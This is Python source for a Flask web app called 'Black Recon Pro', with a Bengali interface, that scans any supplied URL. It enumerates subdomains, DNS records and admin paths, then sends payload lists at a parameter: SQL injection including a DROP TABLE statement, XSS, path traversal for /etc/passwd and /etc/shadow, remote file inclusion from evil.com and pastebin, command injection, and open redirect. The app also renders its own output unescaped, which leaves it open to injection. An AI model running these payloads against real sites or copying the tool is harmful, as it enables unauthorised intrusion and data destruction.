from flask import Flask, render_template_string, request
import requests
import socket
import dns.resolver
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🖤 Black Recon Pro</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        body {
            background: #0a0e17;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
        }
        .box {
            max-width: 1000px;
            width: 100%;
            background: #111927;
            padding: 25px 20px;
            border-radius: 20px;
            border: 1px solid #00ffcc33;
            box-shadow: 0 0 40px #00ffcc11;
        }
        h1 {
            text-align: center;
            font-size: 2rem;
            color: #ff0044;
            text-shadow: 0 0 20px #ff004466;
            word-break: break-word;
        }
        .sub {
            text-align: center;
            color: #886688;
            font-size: 0.9rem;
            margin-bottom: 20px;
        }
        .sub span {
            color: #ff0044;
            font-weight: bold;
        }
        input, button, select {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0;
            border-radius: 12px;
            border: 1px solid #2a3a55;
            background: #0b111e;
            color: #c0d4ff;
            font-size: 1rem;
            outline: none;
            transition: 0.25s;
        }
        input:focus {
            border-color: #ff0044;
            box-shadow: 0 0 0 3px #ff004422;
        }
        button {
            background: #ff004422;
            border-color: #ff0044;
            cursor: pointer;
            font-weight: bold;
            font-size: 1.1rem;
        }
        button:hover {
            background: #ff004466;
        }
        .row {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
        }
        .row input, .row select {
            flex: 1 1 200px;
        }
        .row button {
            flex: 0 0 auto;
            width: auto;
            padding: 14px 30px;
        }
        .result {
            background: #0d1520;
            padding: 18px;
            border-radius: 12px;
            white-space: pre-wrap;
            font-family: 'Courier New', monospace;
            color: #ffccbb;
            max-height: 500px;
            overflow-y: auto;
            margin-top: 15px;
            font-size: 0.9rem;
            line-height: 1.6;
            border-left: 4px solid #ff0044;
        }
        .result::-webkit-scrollbar {
            width: 6px;
        }
        .result::-webkit-scrollbar-thumb {
            background: #ff004488;
            border-radius: 10px;
        }
        .footer {
            text-align: center;
            color: #445566;
            font-size: 0.75rem;
            margin-top: 20px;
        }
        @media (max-width: 600px) {
            h1 { font-size: 1.6rem; }
            .box { padding: 15px; }
            input, button { padding: 12px; }
            .row button { width: 100%; }
        }
    </style>
</head>
<body>
<div class="box">
    <h1>🖤 Black Recon Pro</h1>
    <div class="sub">Developer <span>Arif</span> • v4.0 • <span>#HardMode</span></div>

    <form method="POST" action="/scan">
        <div class="row">
            <input type="text" name="url" placeholder="http://target.com" required>
            <input type="text" name="param" placeholder="প্যারামিটার (যেমন: id, q)" value="id">
            <button type="submit">🚀 Scan</button>
        </div>
    </form>

    {% if result %}
    <div class="result">{{ result|safe }}</div>
    {% endif %}

    <div class="footer">⚠️ শুধুমাত্র অনুমোদিত সিস্টেমে ব্যবহার করুন</div>
</div>
</body>
</html>
"""

# ===== অ্যাডমিন প্যানেল =====
admin_paths = [
    '/admin','/admin.php','/login','/wp-admin','/administrator',
    '/panel','/dashboard','/admincp','/cpanel','/user','/auth',
    '/backend','/admin_area','/controlpanel','/manage','/siteadmin',
    '/master','/console','/setup','/install','/config','/sql',
    '/phpmyadmin','/mysql','/db','/logs','/backup','/old','/test'
]

# ===== পেলোড =====
sqli_payloads = [
    "'", "\"", "' OR '1'='1", "' OR '1'='1' --", "\" OR \"1\"=\"1",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "'; DROP TABLE users--", "' AND 1=1--", "' AND 1=2--"
]
xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)"
]
lfi_payloads = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "../../../../boot.ini",
    "/etc/passwd"
]
rfi_payloads = [
    "http://evil.com/shell.txt",
    "https://pastebin.com/raw/xxxx"
]
cmd_payloads = [
    "; ls", "| whoami", "&& id", "| dir", "; cat /etc/passwd"
]
open_redirect = [
    "//google.com",
    "https://google.com"
]

# ===== স্ক্যানার ফাংশন =====
def scan_admin(url):
    found = []
    for p in admin_paths:
        try:
            r = requests.get(url.rstrip('/')+p, timeout=2, allow_redirects=False)
            if r.status_code in [200,301,302,401,403]:
                found.append(f"✅ অ্যাডমিন: {url.rstrip('/')+p} → {r.status_code}")
        except:
            pass
    return found

def scan_sqli(url, param):
    found = []
    for payload in sqli_payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            r = requests.get(test_url, timeout=2)
            if any(x in r.text.lower() for x in ['mysql','sql','syntax','error','warning','ora-']):
                found.append(f"⚠️ SQLi: {test_url}")
                break
        except:
            pass
    return found

def scan_xss(url, param):
    found = []
    for payload in xss_payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            r = requests.get(test_url, timeout=2)
            if payload in r.text:
                found.append(f"⚠️ XSS: {test_url}")
                break
        except:
            pass
    return found

def scan_lfi(url, param):
    found = []
    for payload in lfi_payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            r = requests.get(test_url, timeout=2)
            if any(x in r.text.lower() for x in ['root:','admin:','[boot loader]','[fonts]']):
                found.append(f"⚠️ LFI: {test_url}")
                break
        except:
            pass
    return found

def scan_rfi(url, param):
    found = []
    for payload in rfi_payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            r = requests.get(test_url, timeout=2)
            if 'shell' in r.text.lower() or 'evil' in r.text.lower():
                found.append(f"⚠️ RFI: {test_url}")
                break
        except:
            pass
    return found

def scan_cmd(url, param):
    found = []
    for payload in cmd_payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            r = requests.get(test_url, timeout=2)
            if any(x in r.text.lower() for x in ['uid=','root','admin','user','nt authority']):
                found.append(f"⚠️ CMD Inj: {test_url}")
                break
        except:
            pass
    return found

def scan_redirect(url, param):
    found = []
    for payload in open_redirect:
        try:
            test_url = f"{url}?{param}={payload}"
            r = requests.get(test_url, timeout=2, allow_redirects=False)
            if r.status_code in [301,302,307] and 'google.com' in r.headers.get('Location',''):
                found.append(f"⚠️ Open Redirect: {test_url}")
                break
        except:
            pass
    return found

def get_subdomains(domain):
    sub_list = ['www','mail','ftp','admin','dev','test','api','dashboard','cpanel','webmail','blog','shop','support','help','portal','secure','vpn','remote','smtp','pop','imap']
    found = []
    for sub in sub_list:
        try:
            full = f"{sub}.{domain}"
            socket.gethostbyname(full)
            found.append(full)
        except:
            pass
    return found

def get_headers(domain):
    try:
        r = requests.get(f"http://{domain}", timeout=3)
        return r.headers
    except:
        return {}

def get_dns(domain):
    records = {}
    for rec in ['A','MX','NS','TXT']:
        try:
            answers = dns.resolver.resolve(domain, rec)
            records[rec] = [str(r) for r in answers]
        except:
            records[rec] = []
    return records

@app.route('/', methods=['GET'])
def index():
    return render_template_string(HTML, result=None)

@app.route('/scan', methods=['POST'])
def scan():
    url = request.form.get('url','').strip()
    param = request.form.get('param','id').strip()
    if not url:
        return render_template_string(HTML, result="❌ URL দিন")
    if not url.startswith(('http://','https://')):
        url = 'http://' + url

    out = []
    out.append("🖤 স্ক্যান শুরু...\n")

    # ডোমেইন বের করা
    domain = url.split('/')[2].split(':')[0]
    out.append(f"🎯 টার্গেট ডোমেইন: {domain}")

    # সাবডোমেইন
    subs = get_subdomains(domain)
    if subs:
        out.append(f"\n🌐 সাবডোমেইন:\n" + "\n".join(subs))
    else:
        out.append("\n🌐 সাবডোমেইন: কিছু পাওয়া যায়নি")

    # হেডার
    headers = get_headers(domain)
    if headers:
        out.append("\n📡 হেডার:")
        for k,v in headers.items():
            out.append(f"  {k}: {v}")
    else:
        out.append("\n📡 হেডার: পাওয়া যায়নি")

    # DNS
    dns_rec = get_dns(domain)
    out.append("\n📋 DNS রেকর্ড:")
    for k,v in dns_rec.items():
        if v:
            out.append(f"  {k}: {', '.join(v)}")
        else:
            out.append(f"  {k}: নেই")

    # অ্যাডমিন
    out.append("\n[+] অ্যাডমিন প্যানেল...")
    out.extend(scan_admin(url))

    if param:
        out.append("\n[+] SQLi...")
        out.extend(scan_sqli(url, param))

        out.append("\n[+] XSS...")
        out.extend(scan_xss(url, param))

        out.append("\n[+] LFI...")
        out.extend(scan_lfi(url, param))

        out.append("\n[+] RFI...")
        out.extend(scan_rfi(url, param))

        out.append("\n[+] কমান্ড ইনজেকশন...")
        out.extend(scan_cmd(url, param))

        out.append("\n[+] Open Redirect...")
        out.extend(scan_redirect(url, param))

    out.append("\n[✔] স্ক্যান সম্পূর্ণ।")
    return render_template_string(HTML, result="\n".join(out))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)